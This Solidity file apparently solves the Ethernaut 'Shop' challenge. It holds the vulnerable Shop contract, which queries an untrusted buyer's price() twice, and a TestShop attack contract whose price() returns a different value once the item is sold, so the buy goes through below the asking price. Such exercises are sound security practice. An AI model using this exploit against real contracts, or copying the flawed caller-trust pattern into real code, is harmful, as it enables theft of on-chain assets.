// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Buyer {
  	function price() external view returns (uint);
}

contract Shop {
	uint public price = 100;
	bool public isSold;

	function buy() public {
		Buyer _buyer = Buyer(msg.sender);

		if (_buyer.price() >= price && !isSold) {
		isSold = true;
		price = _buyer.price();
		}
	}
}

contract TestShop {

	Shop s;

	constructor(address _s) {
		s = Shop(_s);
	}

	function price() external view returns (uint) {
		if(s.isSold()){
			return 0;
		}
		return 100;
	}

	function attack(address _shop) public {
		Shop(_shop).buy();
	}
}